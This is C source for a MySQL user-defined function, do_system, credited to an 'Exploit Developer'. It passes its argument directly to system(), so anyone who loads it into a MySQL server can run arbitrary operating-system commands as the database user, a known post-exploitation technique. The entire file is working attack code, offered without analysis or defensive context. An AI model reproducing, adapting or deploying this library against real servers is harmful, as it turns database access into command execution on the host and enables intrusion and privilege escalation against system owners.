/*
Author: Vishnu Prasadh SR
Job Role: Exploit Developer
*/

#include <mysql.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef __cplusplus
extern "C" {
#endif

my_bool do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
void do_system_deinit(UDF_INIT *initid);
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length,
              char *is_null, char *error);

#ifdef __cplusplus
}
#endif

my_bool do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    printf("Author: Vishnu Prasadh SR\n");
    printf("Job Role: Exploit Developer\n");

    if (args->arg_count != 1)
    {
        strcpy(message, "do_system() requires exactly 1 argument.");
        return 1;
    }

    return 0;
}

void do_system_deinit(UDF_INIT *initid)
{
    // No cleanup required in this example
}

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length,
              char *is_null, char *error)
{
    if (args->args[0] == NULL)
    {
        *is_null = 1;
        return 0;
    }

    int command_result = system(args->args[0]);

    if (command_result == -1)
    {
        *is_null = 1;
        return 0;
    }

    // Set the result to an empty string
    *result = '\0';
    *length = 0;

    return 0;
}

